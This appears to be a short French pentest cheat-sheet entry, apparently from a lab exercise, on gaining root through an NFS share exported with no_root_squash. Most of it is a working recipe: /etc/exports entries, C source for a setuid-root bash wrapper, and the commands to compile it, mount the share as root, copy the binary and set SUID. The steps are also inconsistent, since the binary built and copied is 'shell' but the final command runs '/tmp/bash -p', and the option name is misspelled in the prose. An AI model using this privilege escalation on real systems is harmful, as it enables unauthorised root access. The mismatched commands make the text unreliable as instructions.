Si un volume est monté en NFS avec l'option "no_root_squashfs", alors ce sont les droits de l'utilisateur qui monte ce fichier à distance qui s'appliquent. Exemple, un serveur a un partage disponible avec cette option activée, si je le monte avec l'utilisateur root de mon host, alors j'ai les droits root sur ce partage également. Le principe est ensuite d'uploader un binaire avec un SUID, pour pouvoir faire une privesc.

machine cible:
```bash
cat /etc/exports
---
/var/nfs/general *(rw,no_root_squash)
/tmp *(rw,no_root_squash)
```

Création d'un binaire:

```bash
nano -w shell.c
```

```C
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
--------------------------------
gcc shell.c -o shell
```

Le copier sur la machine cible, puis lui donner le suid:

```bash
machine host:
sudo mount -t nfs 10.129.2.12:/tmp /mnt
sudo cp shell /mnt/
sudo chmod u+s /mnt/shell
```

Puis exécuter le binaire sur la machine cible:

```bash
/tmp/bash -p
```
